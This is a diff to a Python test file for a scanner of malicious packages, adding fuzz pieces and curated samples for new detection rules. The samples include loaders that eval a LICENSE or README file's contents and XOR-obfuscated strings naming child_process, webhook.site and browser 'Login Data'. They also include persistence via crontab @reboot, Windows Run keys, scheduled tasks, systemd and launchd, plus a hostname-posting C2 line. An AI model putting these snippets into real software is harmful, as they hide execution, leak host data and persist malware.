@@ -393,6 +393,17 @@ SELF = ["\n", "\n", " ", "(", ")", "'", '"', '"""', "#", "//", "/*", "*/", "=", 
         "subprocess.run(", "src = ", "code = ", "const p = ", "src", "code", "p", ".split('#')", ".slice(2)",
         "zlib.decompress(", "b64decode(", "requests.post(u, data=socket.gethostname())", "# C2: https://webhook.site/x",
         "\U0001F600", "x" * 50]
+# (0.1.8) licences and readmes, paths read by name, callbacks, .then and `as`
+SELF_ASYNC = ["\n", "\n", " ", "(", ")", "'", '"', "`", "=", ".", ",", ";", "{", "}", "=>", ":\n    ",
+              "const p = ", "p = ", "path.join(__dirname, 'LICENSE')", "path.resolve(__dirname, 'lib', 'README.md')",
+              "`${__dirname}/NOTICE`", "__dirname + '/COPYING'", "os.path.join(os.path.dirname(__file__), 'LICENSE')",
+              "Path(__file__).parent / 'AUTHORS'", "path.join(__dirname, 'LICENSES')", "path.join(__dirname, 'x.js')",
+              "path.join(__dirname, 'package.json')", "'LICENSE'", "LICENSE", "__dirname", "fs.readFile(p, 'utf8', ",
+              "fs.readFile(p, ", "readFileSync(p)", "fsp.readFile(p)", "open(p)", "open(p, 'rb')", "p.read_text()",
+              "(err, data) => ", "(_, d) => ", "function (e, code) ", "(e) => ", ".then((b) => ", ".then(function (t) ",
+              ".then(async x => ", ".then(eval)", " as f", "with open(p) as f", "f.read()", "data", "d", "b", "t", "x",
+              "code", "src = ", "await ", "eval(", "exec(", "new Function(", "vm.runInThisContext(", "execSync(",
+              "os.system(", "console.log(", "decrypt(", "JSON.parse(", "'git tag v' + ", "\U0001F600", "x" * 60]
 SELF_CURATED = [
     "# C2: https://webhook.site/abc\nimport socket, requests, re\nurl = re.search(r'# C2: (\\S+)', open(__file__).read()).group(1)\n"
     "requests.post(url, data=socket.gethostname())\n",
@@ -406,6 +417,23 @@ SELF_CURATED = [
     "import os\nhere = os.path.dirname(__file__)\nexec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",
     'x = """exec(open(__file__).read())"""\nprint(x)\n',
     "const on = open(__file__).read()\nexec(on)\n",
+    # 0.1.8: a licence read asynchronously by a path's name (react-thunk-log 2.23.2), .then, `as`, await
+    "const fs = require('fs');\nconst path = require('path');\nconst parseLib = require('./parse')\n"
+    "const filePath = path.join(__dirname, 'LICENSE');\nfs.readFile(filePath, 'utf8', (_, data) => {\n"
+    "  try {\n    eval(parseLib(data))\n  } catch (err) {}\n});\n",
+    "fs.readFile(path.join(__dirname, 'payload.dat'), (err, buf) => { eval(decrypt(buf)); });",
+    "const p = path.join(__dirname, 'data.bin');\nfs.promises.readFile(p).then((b) => eval(b.toString()));",
+    "const p = `${__dirname}/README`;\nconst src = await fsp.readFile(p, 'utf8');\nvm.runInThisContext(xor(src));",
+    "import os\np = os.path.join(os.path.dirname(__file__), 'LICENSE')\nwith open(p) as f:\n    exec(f.read())\n",
+    "p = Path(__file__).parent / 'NOTICE'\nexec(base64.b64decode(p.read_text()))\n",
+    "require('fs').readFile(__filename, 'utf8', (e, s) => eval(s.split('//@')[1]));",
+    # the value of a path read by name, in a shell command: not counted
+    "const pkgPath = path.join(__dirname, 'package.json');\nconst pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));\n"
+    "execSync('git tag v' + pkg.version);\n",
+    "const tpl = \"fs.readFile(path.join(__dirname, 'LICENSE'), (e, d) => eval(d))\";\n",
+    "const p = path.join(__dirname, 'lib.js');\nfs.readFile(p, (e, d) => eval(d));",
+    "fs.readFile(p, 'utf8', (e, d) => eval(d)" + "\U0001F600" * 2000,
+    "fs.readFile(p, 'utf8', (e, d) => eval(d));\nconst p = path.join(__dirname, 'LICENSE')" + "\U0001F600" * 150,
 ]
 PROSE_CURATED = [
     # a CLI's self-update (huggingface-hub): a comment and a docstring show a cradle, the argv is returned
@@ -460,6 +488,69 @@ PERSIST_CURATED = [
     "const url = `https://github.com/oven-sh/bun/releases/download/bun-v${V}/${asset}.zip`;\nexecFileSync(binPath, [entry]);\n",
     "const w = '.github/workflows/x.yml';\nconst y = `env:\\n  D: ${{ toJSON(secrets) }}`;\n",
 ]
+# programs set to start at login or boot (0.1.8): systemd units and systemctl,
+# launchd agents and launchctl, cron, Run keys, scheduled tasks, the Startup
+# folder, XDG autostart — the places whole and split, the ways to fill them,
+# their look-alikes, and lines and spans measured in code points
+SERVICES = ["\n", "\n", " ", "  ", "\t", "'", '"', "`", ", ", " + ", " / ", "/", "\\", "\\\\", "(", ")", ";", "|", "&",
+            "=", "[", "]", "systemd/user", "systemd/system", "/run/systemd/system", "/etc/systemd/system/x.service",
+            "~/.config/systemd/user/", "'systemd'", "'user'", '"system"', "ExecStart=", "ExecStart =/usr/bin/python3",
+            "\\nExecStart=", "WantedBy=default.target", "systemctl", "systemctl --user enable x", "systemctl enable --now y",
+            "systemctl is-enabled z", " enable", " link", "'systemctl', '--user', 'enable'", "['systemctl', 'daemon-reload']",
+            "LaunchAgents", "~/Library/LaunchDaemons/x.plist", "'Library', 'LaunchAgents'", "<key>RunAtLoad</key>",
+            "ProgramArguments", "launchctl load -w ", "launchctl bootstrap gui/501 ", "['launchctl', 'submit'",
+            "launchctl list", "| crontab -", "|crontab|", "| crontab", "crontab -l", "crontab /tmp/c", "crontab - ",
+            "['crontab', f]", "['crontab', '-l']", "@reboot ", "CronTab(user=True)", "cron.write()", "/etc/cron.d/x",
+            "/etc/crontab", "/var/spool/cron/crontabs/root", "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce", "currentversion/run", "CurrentVersion\\Runner",
+            "reg add ", "REG.EXE ADD", "'reg', ['add'", "New-ItemProperty", "winreg.SetValueEx(", "REG_SZ", "KEY_SET_VALUE",
+            "putValue(", "QueryValueEx(", "schtasks /create /sc onlogon", "SCHTASKS.EXE /Create", "['schtasks', '/create'",
+            "schtasks /query", "Register-ScheduledTask", "Schedule.Service", "RegisterTaskDefinition",
+            "ecs:RegisterTaskDefinition", "Start Menu\\Programs\\Startup", "start menu/programs/startup", "shell:startup",
+            "CSIDL_STARTUP", "'Programs', 'Startup'", "winshell.startup()", "CreateShortcut", ".lnk",
+            "~/.config/autostart/x.desktop", "/etc/xdg/autostart", "'.config', 'autostart'", "{'autostart': true}",
+            "fs.writeFileSync(", "open(p, 'w')", "shutil.copy(", " > ", "cp ", "tee ", "execSync(", "subprocess.run(",
+            "os.system(", "console.log(", "sudo ", "x" * 1001, "y" * 390, "\U0001F600" * 350, "\u017fchtasks",
+            "\u212aEY_SET_VALUE", "\u00e9", "\U0001F600", "\u2028", "\x85"]
+SERVICE_CURATED = [
+    "const unit = path.join(os.homedir(), '.config', 'systemd', 'user', `${n}.service`);\n"
+    "fs.writeFileSync(unit, ['[Service]', `ExecStart=/usr/bin/python3 ${p}`].join('\\n'));\n",
+    "cp x.service ~/.config/systemd/user/ && systemctl --user daemon-reload",
+    "node setup.js && systemctl --user enable --now agent.service",
+    "subprocess.run(['systemctl', '--user', 'enable', 'x.service'])",
+    "if (fs.existsSync('/run/systemd/system')) fs.writeFileSync(p, s)",
+    "const units = fs.readdirSync('/etc/systemd/system');\nfs.writeFileSync('log.txt', units.join())",
+    "console.log('Run: sudo systemctl enable myapp')",
+    "const p = path.join(os.homedir(), 'Library', 'LaunchAgents', 'com.x.plist');\n"
+    "fs.writeFileSync(p, `<key>RunAtLoad</key><true/><key>ProgramArguments</key>`);\n",
+    "cp com.x.plist ~/Library/LaunchAgents/", "execSync(`launchctl load -w ${plist}`)",
+    "const agents = fs.readdirSync(path.join(home, 'Library', 'LaunchAgents'));\nfs.writeFileSync(out, x);\n",
+    "os.system('(crontab -l 2>/dev/null; echo \"@reboot python3 ~/.x/a.py\") | crontab -')",
+    "subprocess.run(['crontab', tmp])", "execSync('crontab -l')", "x = 'a|cron|crontab|csplit|curl'; exec(x)",
+    "from crontab import CronTab\ncron = CronTab(user=True)\ncron.new(command=c).every_reboot()\ncron.write()\n",
+    "with open('/etc/cron.d/updater', 'w') as f:\n    f.write(line)\n",
+    "k = winreg.OpenKey(HKCU, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n"
+    "winreg.SetValueEx(k, 'Updater', 0, winreg.REG_SZ, exe)\n",
+    "execSync('reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v x /d \"' + exe + '\" /f')",
+    "r['HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Run']['Example 1'] = 'x'\n" + "#\n" * 300
+    + "win32.RegSetValueEx(h, n, v)",
+    "CurrentVersion\\Run" + "\U0001F600" * 394 + "REG_SZ", "CurrentVersion\\Run" + "\U0001F600" * 395 + "REG_SZ",
+    "REG_SZ" + "\U0001F600" * 394 + "CurrentVersion\\Run", "REG_SZ" + "\U0001F600" * 395 + "CurrentVersion\\Run",
+    "execSync(`schtasks /create /tn Updater /tr \"${exe}\" /sc onlogon /f`)",
+    "@echo off\nSCHTASKS.EXE /CREATE /SC ONSTART /TN x /TR c:\\x.exe\n", "execSync('schtasks /query /fo csv')",
+    "Register-ScheduledTask -TaskName x -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Action $a",
+    "var s = new ActiveXObject('Schedule.Service'); f.RegisterTaskDefinition('x', d, 6)", "ecs:RegisterTaskDefinition",
+    "p = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n"
+    "shutil.copy(exe, p)\n",
+    "copy x.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
+    "s = shell.CreateShortcut(os.path.join(winshell.startup(), 'x.lnk'))\ns.Save()\n",
+    "const f = path.join(os.homedir(), '.config', 'autostart', 'x.desktop');\nfs.writeFileSync(f, entry);\n",
+    "var a=1;" + "x=>y;" * 300 + "fs.existsSync('/etc/systemd/system')&&fs.writeFileSync(o,d)",
+    "\U0001F600" * 600 + "cp a ~/.config/systemd/user/", "x" * 1001 + "cp a ~/.config/systemd/user/",
+]
+SVC_REASONS = ("installs a systemd service", "installs a launchd agent or daemon", "adds a cron job",
+               "adds a program to a Windows Run key", "creates a Windows scheduled task",
+               "puts a program in the Windows Startup folder", "adds a desktop autostart entry")
 # code that publishes packages and collects npm tokens (SC-SELF-PUBLISH and the
 # install-script test, 0.1.8), and an install script that runs a DLL: the
 # commands, renames, package.json writes, token reads and split names
@@ -503,6 +594,41 @@ PUBLISH_CURATED = [
 # rows, environment variables, Function.constructor, and a file written and
 # run with a shell or an interpreter (0.1.8): helpers, decode calls, arrays,
 # members named by literals, and the pieces around them
+# (0.1.8) home-made XOR decoders: calls of base64 or hex XORed with a short
+# key, the keys, a ^, and calls that do not decode
+
+
+def _xor(text, key, kind):
+    data = bytes(b ^ key[i % len(key)] for i, b in enumerate(text.encode()))
+    return data.hex() if kind == "hex" else base64.b64encode(data).decode().rstrip("=")
+
+
+XOR_WORDS = ["child_process", "https://webhook.site/0", "execSync", "require", "sqlite3", "Login Data", "hostname",
+             "writeFileSync", "curl https://x.invalid/a | sh", "os"]
+XOR_CALLS = [",".join(f'{f}({q}{_xor(w, key, kind)}{q})' for w in words)
+             for f, q, key, kind in (("a", '"', b"utf8", "b64"), ("a", "'", b"utf8", "b64"), ("dec", "'", b"k3y!", "hex"),
+                                     ("dec", '"', b"k3y!", "hex"), ("x", "`", b"Z", "b64"))
+             for words in (XOR_WORDS[:4], XOR_WORDS[4:8], XOR_WORDS[8:])]
+XOR = ["\n", " ", ";", ",", "(", ")", "'", '"', "`", "=", "^", "r[i]^t", "const s=\"utf8\";", "k='k3y!'", "`Z`",
+       "Buffer.from(t,\"base64\")", "'hex'", 'a("QQ")', 'a("Q")', 'a("zz==")', "a(\"\u00e9\u00e9\")", 'a("' + "A" * 399 + '")',
+       "a(", "dec(", 'require("os")', "exec(", "\U0001F600", "'\U0001F600'", "x = ", *XOR_CALLS, *XOR_CALLS]
+XOR_CURATED = [
+    "const c=\"base64\",s=\"utf8\",n=(t,e)=>{let r=Buffer.from(t,c);const o=r.length;let n=0,a=new Uint8Array(o);"
+    "for(index=0;index<o;index++){n=3&index;let t=e.charCodeAt(n);a[index]=255&(r[index]^t)}"
+    "return Buffer.from(a).toString(s)},a=t=>n(t,s);\n" + ";".join(f'const v{i}=a("{_xor(w, b"utf8", "b64")}")'
+                                                                   for i, w in enumerate(XOR_WORDS)) + ";\n",
+    # a key that is the 257th distinct literal is not tried; the 256th is
+    "Buffer " + "".join(f"'k{i}';" for i in range(256)) + "'utf8'; x ^ y;\n"
+    + ",".join(f'a("{_xor(w, b"utf8", "b64")}")' for w in XOR_WORDS),
+    "Buffer " + "".join(f"'k{i}';" for i in range(255)) + "'utf8'; x ^ y;\n"
+    + ",".join(f'a("{_xor(w, b"utf8", "b64")}")' for w in XOR_WORDS),
+    # four calls: too few
+    "Buffer s='utf8'; x^y; " + ",".join(f'a("{_xor(w, b"utf8", "b64")}")' for w in XOR_WORDS[:4]),
+    # one call in ten may stay unread, not two
+    "Buffer s='utf8'; x^y; " + ",".join(f'a("{_xor(w, b"utf8", "b64")}")' for w in XOR_WORDS[:9]) + ',a("x-y")',
+    "Buffer s='utf8'; x^y; " + ",".join(f'a("{_xor(w, b"utf8", "b64")}")' for w in XOR_WORDS[:8]) + ',a("x-y"),a("x-y")',
+    "Buffer x^y 'k3y!' " + " ".join(f"dec('{_xor(w, b'k3y!', 'hex')}')" for w in XOR_WORDS),
+]
 DECODED = ["\n", "\n", " ", "  ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", " + ", ".", "\\", "\\\n",
            "function g(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))); }",
            "const d = (s) => Buffer.from(s, 'base64').toString();", "def unh(x):\n    return bytes.fromhex(x).decode()\n",
@@ -622,11 +748,11 @@ def corpus(seed=20260926, scale=1):
     JavaScript string cannot)."""
     rnd = random.Random(seed)
     cases = (list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED + PERSIST_CURATED + PUBLISH_CURATED
-             + DECODED_CURATED + SPAWN_CURATED + EXFIL_CURATED)
+             + DECODED_CURATED + SPAWN_CURATED + EXFIL_CURATED + SERVICE_CURATED + XOR_CURATED)
     for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                 (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
-                                (SELF, 1500, 14), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10),
-                                (EXFIL, 2500, 10)):
+                                (SELF, 1500, 14), (SELF_ASYNC, 2000, 12), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10),
+                                (EXFIL, 2500, 10), (SERVICES, 2500, 10), (XOR, 1500, 10)):
         for _ in range(count * scale):
             cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
     for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
@@ -753,8 +879,9 @@ class HookParityTests(unittest.TestCase):
         # with a shell or an interpreter, a decoded file run, the decoded view and a reason only it shows
         # and (0.1.8, exfiltration) the Telegram, Discord and Slack secrets, credential files sent to an IP
         # address, a credential sweep, the host name hidden in base64 or sent in a DNS name, the public IP
-        # address sent to a capture service, a miner and browser shortcuts rewritten
-        self.assertEqual(len(counts), 55, counts)
+        # address sent to a capture service, a miner and browser shortcuts rewritten; and (0.1.8) the 7
+        # ways a program is set to start at login or boot
+        self.assertEqual(len(counts), 62, counts)
         # these reasons are rarer in the random stream but present (curated) and well above zero
         rare = {"not followed completely", "deserializes data it receives over the network",
                 "loads a module named by data it receives over the network", "downloads a file and then runs it",
@@ -764,7 +891,7 @@ class HookParityTests(unittest.TestCase):
                 "carries a GitHub Actions workflow that dumps every repository secret",
                 "downloads the Bun runtime from GitHub and runs code with it", "self-publishing",
                 "downloads a script and runs it with a shell or an interpreter", "writes a file it decodes and runs it",
-                "a reason in decoded strings", *EXFIL_REASONS}
+                "a reason in decoded strings", *EXFIL_REASONS, *SVC_REASONS}
         self.assertEqual({k: n for k, n in counts.items() if n < 100 and k not in rare}, {}, counts)
         self.assertGreaterEqual(counts["not followed completely"], 7, counts)   # the curated limit cases
         self.assertGreaterEqual(counts["deserializes data it receives over the network"], 25, counts)
@@ -776,7 +903,7 @@ class HookParityTests(unittest.TestCase):
         self.assertGreaterEqual(counts["carries a GitHub Actions workflow that dumps every repository secret"], 30, counts)
         self.assertGreaterEqual(counts["downloads the Bun runtime from GitHub and runs code with it"], 30, counts)
         self.assertGreaterEqual(counts["self-publishing"], 30, counts)
-        for reason in EXFIL_REASONS:
+        for reason in EXFIL_REASONS + SVC_REASONS:
             self.assertGreaterEqual(counts[reason], 5, (reason, counts))
 
     def test_pattern_text_and_names_are_cores(self):
@@ -803,15 +930,18 @@ class HookParityTests(unittest.TestCase):
                                                  "_PS_ENCODED_MAX", "_STAGER_MIN", "_STAGER_MAX_LITERALS",
                                                  "_PS_EXEC_BACK", "_PS_EXEC_MAX_NAMES", "_SELF_READ_PASSES",
                                                  "_SELF_READ_MAX_CALLS", "_SELF_READ_ARG_SPAN", "_SELF_READ_MAX_ASSIGNS",
+                                                 "_SELF_READ_THEN_SPAN",
                                                  "_LITERAL_SPANS_MAX", "_PERSIST_MAX_LINES", "_SELF_PUB_SPAN",
                                                  "_SELF_PUB_MAX", "_DV_MAX_LITERAL", "_DV_BODY", "_DV_MAX_HELPERS",
-                                                 "_DV_MAX_ARRAYS", "_DV_MAX_CHARS", "_SPAWN_MAX_DEPTH",
+                                                 "_DV_MAX_ARRAYS", "_DV_MAX_CHARS", "_DV_XOR_MIN_CALLS", "_DV_XOR_MAX_CALLS",
+                                                 "_DV_XOR_MIN_BYTES", "_DV_XOR_MAX_KEYS", "_DV_XOR_KEY_MAX", "_SPAWN_MAX_DEPTH",
                                                  "_SPAWN_MAX_FILES", "_SPAWN_NAME_DEPTH", "_SPAWN_MAX_TARGETS",
                                                  "_CHAT_SECRET_MAX", "_CHAT_SECRET_MIN_DISTINCT", "_CRED_SWEEP_SPAN",
                                                  "_CRED_SWEEP_MIN", "_CRED_SWEEP_MAX", "_ENV_COPY_MAX",
-                                                 "_RAW_CONNECT_SPAN", "_IP_LITERAL_MAX", "_DNS_LOOKUP_MAX")})
-        self.assertEqual(len(self.twins["patterns"]), 146)
-        self.assertEqual(len(self.twins["sets"]), 35)
+                                                 "_RAW_CONNECT_SPAN", "_IP_LITERAL_MAX", "_DNS_LOOKUP_MAX",
+                                                 "_SVC_LINE_MAX", "_SVC_RUNKEY_SPAN")})
+        self.assertEqual(len(self.twins["patterns"]), 172)
+        self.assertEqual(len(self.twins["sets"]), 36)
         self.assertEqual(len(self.twins["maps"]), 4)
 
 if __name__ == "__main__":
